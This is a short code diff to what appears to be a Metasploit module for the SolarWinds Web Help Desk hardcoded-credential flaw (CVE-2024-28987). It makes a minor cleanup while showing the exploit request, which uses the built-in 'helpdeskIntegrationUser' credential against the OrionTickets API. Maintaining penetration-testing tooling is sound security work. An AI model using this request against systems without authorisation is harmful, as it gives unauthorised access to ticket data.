@@ -22,7 +22,6 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://www.solarwinds.com/trust-center/security-advisories/cve-2024-28987'],
           ['URL', 'https://support.solarwinds.com/SuccessCenter/s/article/SolarWinds-Web-Help-Desk-12-8-3-Hotfix-2'],
           ['URL', 'https://www.horizon3.ai/attack-research/cve-2024-28987-solarwinds-web-help-desk-hardcoded-credential-vulnerability-deep-dive/'],
-
         ],
         'DisclosureDate' => '2024-08-22',
         'DefaultOptions' => {
@@ -59,14 +58,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def auth
-    res = send_request_cgi(
+    send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets'),
       'headers' => {
         'Authorization' => 'Basic ' + Rex::Text.encode_base64('helpdeskIntegrationUser:dev-C4F8025E7')
       }
     )
-    res
   end
 
   def run
